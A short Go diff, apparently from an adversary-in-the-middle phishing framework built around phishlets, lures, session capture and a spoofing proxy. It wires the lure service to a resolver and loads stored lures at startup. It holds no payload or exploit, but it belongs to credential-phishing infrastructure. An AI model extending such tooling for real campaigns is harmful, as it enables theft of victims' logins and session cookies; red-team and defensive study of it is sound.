@@ -230,7 +230,7 @@ func (ini *initializer) initServices() error {
 
 	ini.sessionStore = sqlite.NewSessionStore(ini.db)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
-	ini.lureSvc = &aitm.LureService{Store: ini.lureStore}
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: ini.resolver}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofProxy = proxy.NewSpoofProxy("")
 	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)
@@ -240,6 +240,10 @@ func (ini *initializer) initServices() error {
 		return fmt.Errorf("loading active phishlets: %w", err)
 	}
 	ini.Daemon.phishletSvc = phishletSvc
+
+	if err := ini.resolver.LoadLuresFromDB(); err != nil {
+		return fmt.Errorf("loading lures: %w", err)
+	}
 
 	return nil
 }
